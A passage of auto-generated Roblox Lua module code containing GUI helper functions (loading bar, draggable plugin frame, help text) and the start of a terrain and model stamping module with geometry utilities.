			local forceTerrainMaterialSelection = function(newMaterialType)
				if not newMaterialType then return end
				if currentMaterial == newMaterialType then return end
		
				local matName = getNameFromEnum(newMaterialType)
				local buttons = scrollFrame:GetChildren()
				for i = 1, #buttons do
					if buttons[i].Name == "Plastic (blue)" and matName == "Plastic (blue)" then goToNewMaterial(buttons[i],matName) return end
					if buttons[i].Name == "Plastic (red)" and matName == "Plastic (red)" then goToNewMaterial(buttons[i],matName) return end
					if string.find(buttons[i].Name, matName) then
						goToNewMaterial(buttons[i],matName)
						return
					end
				end
			end
		
			frame.Changed:connect(function ( prop )
				if prop == "AbsoluteSize" then
					recalculateScroll()
				end
			end)
		
			recalculateScroll()
			return frame, terrainMaterialSelectionChanged, forceTerrainMaterialSelection
		end
		
		t.CreateLoadingFrame = function(name,size,position)
			game:GetService("ContentProvider"):Preload("https://www.roblox.com/asset/?id=35238053")
		
			local loadingFrame = Instance.new("Frame")
			loadingFrame.Name = "LoadingFrame"
			loadingFrame.Style = Enum.FrameStyle.RobloxRound
		
			if size then loadingFrame.Size = size
			else loadingFrame.Size = UDim2.new(0,300,0,160) end
			if position then loadingFrame.Position = position 
			else loadingFrame.Position = UDim2.new(0.5, -150, 0.5,-80) end
		
			local loadingBar = Instance.new("Frame")
			loadingBar.Name = "LoadingBar"
			loadingBar.BackgroundColor3 = Color3.new(0,0,0)
			loadingBar.BorderColor3 = Color3.new(79/255,79/255,79/255)
			loadingBar.Position = UDim2.new(0,0,0,41)
			loadingBar.Size = UDim2.new(1,0,0,30)
			loadingBar.Parent = loadingFrame
		
				local loadingGreenBar = Instance.new("ImageLabel")
				loadingGreenBar.Name = "LoadingGreenBar"
				loadingGreenBar.Image = "https://www.roblox.com/asset/?id=35238053"
				loadingGreenBar.Position = UDim2.new(0,0,0,0)
				loadingGreenBar.Size = UDim2.new(0,0,1,0)
				loadingGreenBar.Visible = false
				loadingGreenBar.Parent = loadingBar
		
				local loadingPercent = Instance.new("TextLabel")
				loadingPercent.Name = "LoadingPercent"
				loadingPercent.BackgroundTransparency = 1
				loadingPercent.Position = UDim2.new(0,0,1,0)
				loadingPercent.Size = UDim2.new(1,0,0,14)
				loadingPercent.Font = Enum.Font.Arial
				loadingPercent.Text = "0%"
				loadingPercent.FontSize = Enum.FontSize.Size14
				loadingPercent.TextColor3 = Color3.new(1,1,1)
				loadingPercent.Parent = loadingBar
		
			local cancelButton = Instance.new("TextButton")
			cancelButton.Name = "CancelButton"
			cancelButton.Position = UDim2.new(0.5,-60,1,-40)
			cancelButton.Size = UDim2.new(0,120,0,40)
			cancelButton.Font = Enum.Font.Arial
			cancelButton.FontSize = Enum.FontSize.Size18
			cancelButton.TextColor3 = Color3.new(1,1,1)
			cancelButton.Text = "Cancel"
			cancelButton.Style = Enum.ButtonStyle.RobloxButton
			cancelButton.Parent = loadingFrame
		
			local loadingName = Instance.new("TextLabel")
			loadingName.Name = "loadingName"
			loadingName.BackgroundTransparency = 1
			loadingName.Size = UDim2.new(1,0,0,18)
			loadingName.Position = UDim2.new(0,0,0,2)
			loadingName.Font = Enum.Font.Arial
			loadingName.Text = name
			loadingName.TextColor3 = Color3.new(1,1,1)
			loadingName.TextStrokeTransparency = 1
			loadingName.FontSize = Enum.FontSize.Size18
			loadingName.Parent = loadingFrame
		
			local cancelButtonClicked = Instance.new("BindableEvent")
			cancelButtonClicked.Name = "CancelButtonClicked"
			cancelButtonClicked.Parent = cancelButton
			cancelButton.MouseButton1Click:connect(function()
				cancelButtonClicked:Fire()
			end)
		
			local updateLoadingGuiPercent = function(percent, tweenAction, tweenLength)
				if percent and type(percent) ~= "number" then
					error("updateLoadingGuiPercent expects number as argument, got",type(percent),"instead")
				end
		
				local newSize = nil
				if percent < 0 then
					newSize = UDim2.new(0,0,1,0)
				elseif percent > 1 then
					newSize = UDim2.new(1,0,1,0)
				else
					newSize = UDim2.new(percent,0,1,0)
				end
		
				if tweenAction then
					if not tweenLength then
						error("updateLoadingGuiPercent is set to tween new percentage, but got no tween time length! Please pass this in as third argument")
					end
		
					if (newSize.X.Scale > 0) then
						loadingGreenBar.Visible = true
						loadingGreenBar:TweenSize(	newSize,
													Enum.EasingDirection.Out,
													Enum.EasingStyle.Quad,
													tweenLength,
													true)
					else
						loadingGreenBar:TweenSize(	newSize,
													Enum.EasingDirection.Out,
													Enum.EasingStyle.Quad,
													tweenLength,
													true,
													function() 
														if (newSize.X.Scale < 0) then
															loadingGreenBar.Visible = false
														end
													end)
					end
		
				else
					loadingGreenBar.Size = newSize
					loadingGreenBar.Visible = (newSize.X.Scale > 0)
				end
			end
		
			loadingGreenBar.Changed:connect(function(prop)
				if prop == "Size" then
					loadingPercent.Text = tostring( math.ceil(loadingGreenBar.Size.X.Scale * 100) ) .. "%"
				end
			end)
		
			return loadingFrame, updateLoadingGuiPercent, cancelButtonClicked
		end
		
		t.CreatePluginFrame = function (name,size,position,scrollable,parent)
			local function createMenuButton(size,position,text,fontsize,name,parent)
				local button = Instance.new("TextButton",parent)
				button.AutoButtonColor = false
				button.Name = name
				button.BackgroundTransparency = 1
				button.Position = position
				button.Size = size
				button.Font = Enum.Font.ArialBold
				button.FontSize = fontsize
				button.Text =  text
				button.TextColor3 = Color3.new(1,1,1)
				button.BorderSizePixel = 0
				button.BackgroundColor3 = Color3.new(20/255,20/255,20/255)
		
				button.MouseEnter:connect(function ( )
					if button.Selected then return end
					button.BackgroundTransparency = 0
				end)
				button.MouseLeave:connect(function ( )
					if button.Selected then return end
					button.BackgroundTransparency = 1
				end)
		
				return button
		
			end
		
			local dragBar = Instance.new("Frame",parent)
			dragBar.Name = tostring(name) .. "DragBar"
			dragBar.BackgroundColor3 = Color3.new(39/255,39/255,39/255)
			dragBar.BorderColor3 = Color3.new(0,0,0)
			if size then
				dragBar.Size =  UDim2.new(size.X.Scale,size.X.Offset,0,20)  + UDim2.new(0,20,0,0)
			else
				dragBar.Size = UDim2.new(0,183,0,20)
			end
			if position then
				dragBar.Position = position
			end
			dragBar.Active = true
			dragBar.Draggable = true
			--dragBar.Visible = false
			dragBar.MouseEnter:connect(function (  )
				dragBar.BackgroundColor3 = Color3.new(49/255,49/255,49/255)
			end)
			dragBar.MouseLeave:connect(function (  )
				dragBar.BackgroundColor3 = Color3.new(39/255,39/255,39/255)
			end)
		
			-- plugin name label
			local pluginNameLabel = Instance.new("TextLabel",dragBar)
			pluginNameLabel.Name = "BarNameLabel"
			pluginNameLabel.Text = " " .. tostring(name)
			pluginNameLabel.TextColor3 = Color3.new(1,1,1)
			pluginNameLabel.TextStrokeTransparency = 0
			pluginNameLabel.Size = UDim2.new(1,0,1,0)
			pluginNameLabel.Font = Enum.Font.ArialBold
			pluginNameLabel.FontSize = Enum.FontSize.Size18
			pluginNameLabel.TextXAlignment = Enum.TextXAlignment.Left
			pluginNameLabel.BackgroundTransparency = 1
		
			-- close button
			local closeButton = createMenuButton(UDim2.new(0,15,0,17),UDim2.new(1,-16,0.5,-8),"X",Enum.FontSize.Size14,"CloseButton",dragBar)
			local closeEvent = Instance.new("BindableEvent")
			closeEvent.Name = "CloseEvent"
			closeEvent.Parent = closeButton
			closeButton.MouseButton1Click:connect(function ()
				closeEvent:Fire()
				closeButton.BackgroundTransparency = 1
			end)
		
			-- help button
			local helpButton = createMenuButton(UDim2.new(0,15,0,17),UDim2.new(1,-51,0.5,-8),"?",Enum.FontSize.Size14,"HelpButton",dragBar)
			local helpFrame = Instance.new("Frame",dragBar)
			helpFrame.Name = "HelpFrame"
			helpFrame.BackgroundColor3 = Color3.new(0,0,0)
			helpFrame.Size = UDim2.new(0,300,0,552)
			helpFrame.Position = UDim2.new(1,5,0,0)
			helpFrame.Active = true
			helpFrame.BorderSizePixel = 0
			helpFrame.Visible = false
		
			helpButton.MouseButton1Click:connect(function(  )
				helpFrame.Visible = not helpFrame.Visible
				if helpFrame.Visible then
					helpButton.Selected = true
					helpButton.BackgroundTransparency = 0
					local screenGui = getLayerCollectorAncestor(helpFrame)
					if screenGui then
						if helpFrame.AbsolutePosition.X + helpFrame.AbsoluteSize.X > screenGui.AbsoluteSize.X then --position on left hand side
							helpFrame.Position = UDim2.new(0,-5 - helpFrame.AbsoluteSize.X,0,0)
						else -- position on right hand side
							helpFrame.Position = UDim2.new(1,5,0,0)
						end
					else
						helpFrame.Position = UDim2.new(1,5,0,0)
					end
				else
					helpButton.Selected = false
					helpButton.BackgroundTransparency = 1
				end
			end)
		
			local minimizeButton = createMenuButton(UDim2.new(0,16,0,17),UDim2.new(1,-34,0.5,-8),"-",Enum.FontSize.Size14,"MinimizeButton",dragBar)
			minimizeButton.TextYAlignment = Enum.TextYAlignment.Top
		
			local minimizeFrame = Instance.new("Frame",dragBar)
			minimizeFrame.Name = "MinimizeFrame"
			minimizeFrame.BackgroundColor3 = Color3.new(73/255,73/255,73/255)
			minimizeFrame.BorderColor3 = Color3.new(0,0,0)
			minimizeFrame.Position = UDim2.new(0,0,1,0)
			if size then
				minimizeFrame.Size =  UDim2.new(size.X.Scale,size.X.Offset,0,50) + UDim2.new(0,20,0,0)
			else
				minimizeFrame.Size = UDim2.new(0,183,0,50)
			end
			minimizeFrame.Visible = false
		
			local minimizeBigButton = Instance.new("TextButton",minimizeFrame)
			minimizeBigButton.Position = UDim2.new(0.5,-50,0.5,-20)
			minimizeBigButton.Name = "MinimizeButton"
			minimizeBigButton.Size = UDim2.new(0,100,0,40)
			minimizeBigButton.Style = Enum.ButtonStyle.RobloxButton
			minimizeBigButton.Font = Enum.Font.ArialBold
			minimizeBigButton.FontSize = Enum.FontSize.Size18
			minimizeBigButton.TextColor3 = Color3.new(1,1,1)
			minimizeBigButton.Text = "Show"
		
			local separatingLine = Instance.new("Frame",dragBar)
			separatingLine.Name = "SeparatingLine"
			separatingLine.BackgroundColor3 = Color3.new(115/255,115/255,115/255)
			separatingLine.BorderSizePixel = 0
			separatingLine.Position = UDim2.new(1,-18,0.5,-7)
			separatingLine.Size = UDim2.new(0,1,0,14)
		
			local otherSeparatingLine = separatingLine:clone()
			otherSeparatingLine.Position = UDim2.new(1,-35,0.5,-7)
			otherSeparatingLine.Parent = dragBar
		
			local widgetContainer = Instance.new("Frame",dragBar)
			widgetContainer.Name = "WidgetContainer"
			widgetContainer.BackgroundTransparency = 1
			widgetContainer.Position = UDim2.new(0,0,1,0)
			widgetContainer.BorderColor3 = Color3.new(0,0,0)
			if not scrollable then
				widgetContainer.BackgroundTransparency = 0
				widgetContainer.BackgroundColor3 = Color3.new(72/255,72/255,72/255)
			end
		
			if size then
				if scrollable then
					widgetContainer.Size = size
				else
					widgetContainer.Size = UDim2.new(0,dragBar.AbsoluteSize.X,size.Y.Scale,size.Y.Offset)
				end
			else
				if scrollable then
					widgetContainer.Size = UDim2.new(0,163,0,400)
				else
					widgetContainer.Size = UDim2.new(0,dragBar.AbsoluteSize.X,0,400)
				end
			end
			if position then
				widgetContainer.Position = position + UDim2.new(0,0,0,20)
			end
		
			local frame,control,verticalDragger = nil
			if scrollable then
				--frame for widgets
				frame,control = t.CreateTrueScrollingFrame()
				frame.Size = UDim2.new(1, 0, 1, 0)
				frame.BackgroundColor3 = Color3.new(72/255,72/255,72/255)
				frame.BorderColor3 = Color3.new(0,0,0)
				frame.Active = true
				frame.Parent = widgetContainer
				control.Parent = dragBar
				control.BackgroundColor3 = Color3.new(72/255,72/255,72/255)
				control.BorderSizePixel = 0
				control.BackgroundTransparency = 0
				control.Position = UDim2.new(1,-21,1,1)
				if size then
					control.Size = UDim2.new(0,21,size.Y.Scale,size.Y.Offset)
				else
					control.Size = UDim2.new(0,21,0,400)
				end
				control:FindFirstChild("ScrollDownButton").Position = UDim2.new(0,0,1,-20)
		
				local fakeLine = Instance.new("Frame",control)
				fakeLine.Name = "FakeLine"
				fakeLine.BorderSizePixel = 0
				fakeLine.BackgroundColor3 = Color3.new(0,0,0)
				fakeLine.Size = UDim2.new(0,1,1,1)
				fakeLine.Position = UDim2.new(1,0,0,0)
		
				verticalDragger = Instance.new("TextButton",widgetContainer)
				verticalDragger.ZIndex = 2
				verticalDragger.AutoButtonColor = false
				verticalDragger.Name = "VerticalDragger"
				verticalDragger.BackgroundColor3 = Color3.new(50/255,50/255,50/255)
				verticalDragger.BorderColor3 = Color3.new(0,0,0)
				verticalDragger.Size = UDim2.new(1,20,0,20)
				verticalDragger.Position = UDim2.new(0,0,1,0)
				verticalDragger.Active = true
				verticalDragger.Text = ""
		
				local scrubFrame = Instance.new("Frame",verticalDragger)
				scrubFrame.Name = "ScrubFrame"
				scrubFrame.BackgroundColor3 = Color3.new(1,1,1)
				scrubFrame.BorderSizePixel = 0
				scrubFrame.Position = UDim2.new(0.5,-5,0.5,0)
				scrubFrame.Size = UDim2.new(0,10,0,1)
				scrubFrame.ZIndex = 5
				local scrubTwo = scrubFrame:clone()
				scrubTwo.Position = UDim2.new(0.5,-5,0.5,-2)
				scrubTwo.Parent = verticalDragger
				local scrubThree = scrubFrame:clone()
				scrubThree.Position = UDim2.new(0.5,-5,0.5,2)
				scrubThree.Parent = verticalDragger
		
				local areaSoak = Instance.new("TextButton",getLayerCollectorAncestor(parent))
				areaSoak.Name = "AreaSoak"
				areaSoak.Size = UDim2.new(1,0,1,0)
				areaSoak.BackgroundTransparency = 1
				areaSoak.BorderSizePixel = 0
				areaSoak.Text = ""
				areaSoak.ZIndex = 10
				areaSoak.Visible = false
				areaSoak.Active = true
		
				local draggingVertical = false
				local startYPos = nil
				verticalDragger.MouseEnter:connect(function ()
					verticalDragger.BackgroundColor3 = Color3.new(60/255,60/255,60/255)
				end)
				verticalDragger.MouseLeave:connect(function ()
					verticalDragger.BackgroundColor3 = Color3.new(50/255,50/255,50/255)
				end)
				verticalDragger.MouseButton1Down:connect(function(x,y)
					draggingVertical = true
					areaSoak.Visible = true
					startYPos = y
				end)
				areaSoak.MouseButton1Up:connect(function (  )
					draggingVertical = false
					areaSoak.Visible = false
				end)
				areaSoak.MouseMoved:connect(function(x,y)
					if not draggingVertical then return end
		
					local yDelta = y - startYPos
					if not control.ScrollDownButton.Visible and yDelta > 0 then
						return
					end
		
					if (widgetContainer.Size.Y.Offset + yDelta) < 150 then
						widgetContainer.Size = UDim2.new(widgetContainer.Size.X.Scale, widgetContainer.Size.X.Offset,widgetContainer.Size.Y.Scale,150)
						control.Size = UDim2.new (0,21,0,150)
						return 
					end 
		
					startYPos = y
		
					if widgetContainer.Size.Y.Offset + yDelta >= 0 then
						widgetContainer.Size = UDim2.new(widgetContainer.Size.X.Scale, widgetContainer.Size.X.Offset,widgetContainer.Size.Y.Scale,widgetContainer.Size.Y.Offset + yDelta)
						control.Size = UDim2.new(0,21,0,control.Size.Y.Offset + yDelta )
					end
				end)
			end
		
			local function switchMinimize()
				minimizeFrame.Visible = not minimizeFrame.Visible
				if scrollable then
					frame.Visible = not frame.Visible
					verticalDragger.Visible = not verticalDragger.Visible
					control.Visible = not control.Visible
				else
					widgetContainer.Visible = not widgetContainer.Visible
				end
		
				if minimizeFrame.Visible then
					minimizeButton.Text = "+"
				else
					minimizeButton.Text = "-"
				end
			end
		
			minimizeBigButton.MouseButton1Click:connect(function (  )
				switchMinimize()
			end)
		
			minimizeButton.MouseButton1Click:connect(function(  )
				switchMinimize()
			end)
		
			if scrollable then
				return dragBar, frame, helpFrame, closeEvent
			else
				return dragBar, widgetContainer, helpFrame, closeEvent
			end
		end
		
		t.Help = 
			function(funcNameOrFunc) 
				--input argument can be a string or a function.  Should return a description (of arguments and expected side effects)
				if funcNameOrFunc == "CreatePropertyDropDownMenu" or funcNameOrFunc == t.CreatePropertyDropDownMenu then
					return "Function CreatePropertyDropDownMenu.  " ..
						   "Arguments: (instance, propertyName, enumType).  " .. 
						   "Side effect: returns a container with a drop-down-box that is linked to the 'property' field of 'instance' which is of type 'enumType'" 
				end 
				if funcNameOrFunc == "CreateDropDownMenu" or funcNameOrFunc == t.CreateDropDownMenu then
					return "Function CreateDropDownMenu.  " .. 
					       "Arguments: (items, onItemSelected).  " .. 
						   "Side effect: Returns 2 results, a container to the gui object and a 'updateSelection' function for external updating.  The container is a drop-down-box created around a list of items" 
				end 
				if funcNameOrFunc == "CreateMessageDialog" or funcNameOrFunc == t.CreateMessageDialog then
					return "Function CreateMessageDialog.  " .. 
					       "Arguments: (title, message, buttons). " .. 
					       "Side effect: Returns a gui object of a message box with 'title' and 'message' as passed in.  'buttons' input is an array of Tables contains a 'Text' and 'Function' field for the text/callback of each button"
				end		
				if funcNameOrFunc == "CreateStyledMessageDialog" or funcNameOrFunc == t.CreateStyledMessageDialog then
					return "Function CreateStyledMessageDialog.  " .. 
					       "Arguments: (title, message, style, buttons). " .. 
					       "Side effect: Returns a gui object of a message box with 'title' and 'message' as passed in.  'buttons' input is an array of Tables contains a 'Text' and 'Function' field for the text/callback of each button, 'style' is a string, either Error, Notify or Confirm"
				end
				if funcNameOrFunc == "GetFontHeight" or funcNameOrFunc == t.GetFontHeight then
					return "Function GetFontHeight.  " .. 
					       "Arguments: (font, fontSize). " .. 
					       "Side effect: returns the size in pixels of the given font + fontSize"
				end
				if funcNameOrFunc == "LayoutGuiObjects" or funcNameOrFunc == t.LayoutGuiObjects then
				
				end
				if funcNameOrFunc == "CreateScrollingFrame" or funcNameOrFunc == t.CreateScrollingFrame then
					return "Function CreateScrollingFrame.  " .. 
					   "Arguments: (orderList, style) " .. 
					   "Side effect: returns 4 objects, (scrollFrame, scrollUpButton, scrollDownButton, recalculateFunction).  'scrollFrame' can be filled with GuiObjects.  It will lay them out and allow scrollUpButton/scrollDownButton to interact with them.  Orderlist is optional (and specifies the order to layout the children.  Without orderlist, it uses the children order. style is also optional, and allows for a 'grid' styling if style is passed 'grid' as a string.  recalculateFunction can be called when a relayout is needed (when orderList changes)"
				end
				if funcNameOrFunc == "CreateTrueScrollingFrame" or funcNameOrFunc == t.CreateTrueScrollingFrame then
					return "Function CreateTrueScrollingFrame.  " .. 
					   "Arguments: (nil) " .. 
					   "Side effect: returns 2 objects, (scrollFrame, controlFrame).  'scrollFrame' can be filled with GuiObjects, and they will be clipped if not inside the frame's bounds. controlFrame has children scrollup and scrolldown, as well as a slider.  controlFrame can be parented to any guiobject and it will readjust itself to fit."
				end
				if funcNameOrFunc == "AutoTruncateTextObject" or funcNameOrFunc == t.AutoTruncateTextObject then
					return "Function AutoTruncateTextObject.  " .. 
					   "Arguments: (textLabel) " .. 
					   "Side effect: returns 2 objects, (textLabel, changeText).  The 'textLabel' input is modified to automatically truncate text (with ellipsis), if it gets too small to fit.  'changeText' is a function that can be used to change the text, it takes 1 string as an argument"
				end
				if funcNameOrFunc == "CreateSlider" or funcNameOrFunc == t.CreateSlider then
					return "Function CreateSlider.  " ..
						"Arguments: (steps, width, position) " ..
						"Side effect: returns 2 objects, (sliderGui, sliderPosition).  The 'steps' argument specifies how many different positions the slider can hold along the bar.  'width' specifies in pixels how wide the bar should be (modifiable afterwards if desired). 'position' argument should be a UDim2 for slider positioning. 'sliderPosition' is an IntValue whose current .Value specifies the specific step the slider is currently on."
				end
				if funcNameOrFunc == "CreateSliderNew" or funcNameOrFunc == t.CreateSliderNew then
					return "Function CreateSliderNew.  " ..
						"Arguments: (steps, width, position) " ..
						"Side effect: returns 2 objects, (sliderGui, sliderPosition).  The 'steps' argument specifies how many different positions the slider can hold along the bar.  'width' specifies in pixels how wide the bar should be (modifiable afterwards if desired). 'position' argument should be a UDim2 for slider positioning. 'sliderPosition' is an IntValue whose current .Value specifies the specific step the slider is currently on."
				end
				if funcNameOrFunc == "CreateLoadingFrame" or funcNameOrFunc == t.CreateLoadingFrame then
					return "Function CreateLoadingFrame.  " ..
						"Arguments: (name, size, position) " ..
						"Side effect: Creates a gui that can be manipulated to show progress for a particular action.  Name appears above the loading bar, and size and position are udim2 values (both size and position are optional arguments).  Returns 3 arguments, the first being the gui created. The second being updateLoadingGuiPercent, which is a bindable function.  This function takes one argument (two optionally), which should be a number between 0 and 1, representing the percentage the loading gui should be at.  The second argument to this function is a boolean value that if set to true will tween the current percentage value to the new percentage value, therefore our third argument is how long this tween should take. Our third returned argument is a BindableEvent, that when fired means that someone clicked the cancel button on the dialog."
				end
				if funcNameOrFunc == "CreateTerrainMaterialSelector" or funcNameOrFunc == t.CreateTerrainMaterialSelector then
					return "Function CreateTerrainMaterialSelector.  " ..
						"Arguments: (size, position) " ..
						"Side effect: Size and position are UDim2 values that specifies the selector's size and position.  Both size and position are optional arguments. This method returns 3 objects (terrainSelectorGui, terrainSelected, forceTerrainSelection).  terrainSelectorGui is just the gui object that we generate with this function, parent it as you like. TerrainSelected is a BindableEvent that is fired whenever a new terrain type is selected in the gui.  ForceTerrainSelection is a function that takes an argument of Enum.CellMaterial and will force the gui to show that material as currently selected."
				end
			end
			
		return t
		
	end
}

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local rbx_stamper = Instance.new("ModuleScript")
rbx_stamper.Name = "RbxStamper"
rbx_stamper.Parent = workspace

--// Modules

local modules = {
	[rbx_stamper] = function()
		local t = {}
		
		-- Do a line/plane intersection.  The line starts at the camera.  The plane is at y == 0, normal(0, 1, 0)
		--
		-- vectorPos - End point of the line.
		--
		-- Return:
		-- cellPos - The terrain cell intersection point if there is one, vectorPos if there isn't.
		-- hit - Whether there was a plane intersection.  Value is true if there was, false if not.
		function PlaneIntersection(vectorPos)
			local hit = false
			local currCamera = game:GetService("Workspace").CurrentCamera
			local startPos = Vector3.new(currCamera.CoordinateFrame.p.X, currCamera.CoordinateFrame.p.Y, currCamera.CoordinateFrame.p.Z)
			local endPos = Vector3.new(vectorPos.X, vectorPos.Y, vectorPos.Z)
			local normal = Vector3.new(0, 1, 0)
			local p3 = Vector3.new(0, 0, 0)
			local startEndDot = normal:Dot(endPos - startPos)
			local cellPos = vectorPos
			if startEndDot ~= 0  then
				local t = normal:Dot(p3 - startPos) / startEndDot
				if(t >=0 and t <=1) then
					local intersection = ((endPos - startPos) * t) + startPos
					cellPos = game:GetService("Workspace").Terrain:WorldToCell(intersection)
					hit = true
				end
			end
		
			return cellPos, hit
		end
		
		
		-- Purpose:
		-- Checks for terrain touched by the mouse hit.
		-- Will do a plane intersection if no terrain is touched.
		--
		-- mouse - Mouse to check the .hit for.
		--
		-- Return:
		-- cellPos - Cell position hit.  Nil if none.
		function GetTerrainForMouse(mouse)
			-- There was no target, so all it could be is a plane intersection.
			-- Check for a plane intersection.  If there isn't one then nothing will get hit.
			local cell = game:GetService("Workspace").Terrain:WorldToCellPreferSolid(Vector3.new(mouse.hit.x, mouse.hit.y, mouse.hit.z))
			local planeLoc = nil
			local hit = nil
			-- If nothing was hit, do the plane intersection.
			if 0 == game:GetService("Workspace").Terrain:GetCell(cell.X, cell.Y, cell.Z).Value then
				cell = nil
				planeLoc, hit = PlaneIntersection(Vector3.new(mouse.hit.x, mouse.hit.y, mouse.hit.z))
				if hit then
					cell = planeLoc
				end
			end
			return cell
		end
		
		-- setup helper functions
		local insertBoundingBoxOverlapVector = Vector3.new(.3, .3, .3) -- we can still stamp if our character extrudes into the target stamping space by .3 or fewer units
		
		-- rotates a model by yAngle radians about the global y-axis
		local function rotatePartAndChildren(part, rotCF, offsetFromOrigin)
			-- rotate this thing, if it's a part
			if part:IsA("BasePart") then
				part.CFrame = (rotCF * (part.CFrame - offsetFromOrigin)) + offsetFromOrigin
			end
		
			-- recursively do the same to all children
			local partChildren = part:GetChildren()
			for c = 1, #partChildren do rotatePartAndChildren(partChildren[c], rotCF, offsetFromOrigin) end
		end
		
		local function modelRotate(model, yAngle)
			local rotCF = CFrame.Angles(0, yAngle, 0)
			local offsetFromOrigin = model:GetModelCFrame().p
		
			rotatePartAndChildren(model, rotCF, offsetFromOrigin)
		end
		
		
		local function collectParts(object, baseParts, scripts, decals)
			if object:IsA("BasePart") then
				baseParts[#baseParts+1] = object
			elseif object:IsA("Script") then
				scripts[#scripts+1] = object
			elseif object:IsA("Decal") then
				decals[#decals+1] = object
			end
		
			for index,child in pairs(object:GetChildren()) do
				collectParts(child, baseParts, scripts, decals)
			end
		end
		
		local function clusterPartsInRegion(startVector, endVector)
			local cluster = game:GetService("Workspace"):FindFirstChild("Terrain")
		
			local startCell = cluster:WorldToCell(startVector)
			local endCell = cluster:WorldToCell(endVector)
		
			local startX = startCell.X
			local startY = startCell.Y
			local startZ = startCell.Z
		
			local endX = endCell.X
			local endY = endCell.Y
			local endZ = endCell.Z
		
			if startX < cluster.MaxExtents.Min.X then startX = cluster.MaxExtents.Min.X end
			if startY < cluster.MaxExtents.Min.Y then startY = cluster.MaxExtents.Min.Y end
			if startZ < cluster.MaxExtents.Min.Z then startZ = cluster.MaxExtents.Min.Z end
		
			if endX > cluster.MaxExtents.Max.X then endX = cluster.MaxExtents.Max.X end
			if endY > cluster.MaxExtents.Max.Y then endY = cluster.MaxExtents.Max.Y end
			if endZ > cluster.MaxExtents.Max.Z then endZ = cluster.MaxExtents.Max.Z end
		
			for x = startX, endX do
				for y = startY, endY do
					for z = startZ, endZ do
						if (cluster:GetCell(x, y, z).Value) > 0 then return true end
					end
				end
			end
		
			return false
		end
		
		local function findSeatsInModel(parent, seatTable)
			if not parent then return end
		
			if parent.className == "Seat" or parent.className == "VehicleSeat" then
				table.insert(seatTable, parent)
			end
			local myChildren = parent:GetChildren()
			for j = 1, #myChildren do
				findSeatsInModel(myChildren[j], seatTable)
			end
		end
		
		local function setSeatEnabledStatus(model, isEnabled)
			local seatList = {}
			findSeatsInModel(model, seatList)
		
			if isEnabled then
				-- remove any welds called "SeatWeld" in seats
				for i = 1, #seatList do
					local nextSeat = seatList[i]:FindFirstChild("SeatWeld")
					while nextSeat do nextSeat:Remove() nextSeat = seatList[i]:FindFirstChild("SeatWeld") end
				end
			else
				-- put a weld called "SeatWeld" in every seat
				--   this tricks it into thinking there's already someone sitting there, and it won't make you sit XD
				for i = 1, #seatList do
					local fakeWeld = Instance.new("Weld")
					fakeWeld.Name = "SeatWeld"
					fakeWeld.Parent = seatList[i]
				end
			end
		end
		
		local function autoAlignToFace(parts)
			local aatf = parts:FindFirstChild("AutoAlignToFace")
			if aatf then return aatf.Value else return false end
		end
		
		local function getClosestAlignedWorldDirection(aVector3InWorld)
			local xDir = Vector3.new(1,0,0)
			local yDir = Vector3.new(0,1,0)
			local zDir = Vector3.new(0,0,1)
			local xDot = aVector3InWorld.x * xDir.x + aVector3InWorld.y * xDir.y + aVector3InWorld.z * xDir.z
			local yDot = aVector3InWorld.x * yDir.x + aVector3InWorld.y * yDir.y + aVector3InWorld.z * yDir.z
			local zDot = aVector3InWorld.x * zDir.x + aVector3InWorld.y * zDir.y + aVector3InWorld.z * zDir.z
		
			if math.abs(xDot) > math.abs(yDot) and math.abs(xDot) > math.abs(zDot) then
				if xDot > 0 then
					return 0
				else
					return 3
				end
			elseif math.abs(yDot) > math.abs(xDot) and math.abs(yDot) > math.abs(zDot) then
				if yDot > 0 then
					return 1
				else
					return 4
				end
			else
				if zDot > 0 then
					return 2
				else
					return 5
				end
			end
		end
		
		local function positionPartsAtCFrame3(aCFrame, currentParts)
			local insertCFrame = nil
			if not currentParts then return currentParts end
			if currentParts and (currentParts:IsA("Model") or currentParts:IsA("Tool")) then
				insertCFrame = currentParts:GetModelCFrame()
				currentParts:TranslateBy(aCFrame.p - insertCFrame.p)
			else
				currentParts.CFrame = aCFrame
			end
			return currentParts
		end
		
		local function calcRayHitTime(rayStart, raySlope, intersectionPlane)
			if math.abs(raySlope) < .01 then return 0 end -- 0 slope -->  we just say intersection time is 0, and sidestep this dimension
			return (intersectionPlane - rayStart) / raySlope
		end
		
		local function modelTargetSurface(partOrModel, rayStart, rayEnd)
			if not partOrModel then
				return 0
			end
		
			local modelCFrame = nil
			local modelSize = nil
			if partOrModel:IsA("Model") then
				modelCFrame = partOrModel:GetModelCFrame()
				modelSize = partOrModel:GetModelSize()
			else
				modelCFrame = partOrModel.CFrame
				modelSize = partOrModel.Size
			end
		
			local mouseRayStart = modelCFrame:pointToObjectSpace(rayStart)
			local mouseRayEnd = modelCFrame:pointToObjectSpace(rayEnd)
			local mouseSlope = mouseRayEnd - mouseRayStart
		
			local xPositive = 1
			local yPositive = 1
			local zPositive = 1
			if mouseSlope.X > 0 then xPositive = -1 end
			if mouseSlope.Y > 0 then yPositive = -1 end
			if mouseSlope.Z > 0 then zPositive = -1 end
		
			-- find which surface the transformed mouse ray hits (using modelSize):
			local xHitTime = calcRayHitTime(mouseRayStart.X, mouseSlope.X, modelSize.X/2 * xPositive)
			local yHitTime = calcRayHitTime(mouseRayStart.Y, mouseSlope.Y, modelSize.Y/2 * yPositive)
			local zHitTime = calcRayHitTime(mouseRayStart.Z, mouseSlope.Z, modelSize.Z/2 * zPositive)
		
			local hitFace = 0
		
			--if xHitTime >= 0 and yHitTime >= 0 and zHitTime >= 0 then
			if xHitTime > yHitTime then
				if xHitTime > zHitTime then
					-- xFace is hit
					hitFace = 1*xPositive
				else
					-- zFace is hit
					hitFace = 3*zPositive
				end
			else
				if yHitTime > zHitTime then
					-- yFace is hit
					hitFace = 2*yPositive
				else
					-- zFace is hit
					hitFace = 3*zPositive
				end
			end
		
			return hitFace
		end
		
		local function getBoundingBox2(partOrModel)
		
			-- for models, the bounding box is defined as the minimum and maximum individual part bounding boxes
			-- relative to the first part's coordinate frame.
			local minVec = Vector3.new(math.huge, math.huge, math.huge)
			local maxVec = Vector3.new(-math.huge, -math.huge, -math.huge)
		
			if partOrModel:IsA("Terrain") then
				minVec = Vector3.new(-2, -2, -2)
				maxVec = Vector3.new(2, 2, 2)
			elseif partOrModel:IsA("BasePart") then
				minVec = -0.5 * partOrModel.Size
				maxVec = -minVec
			else
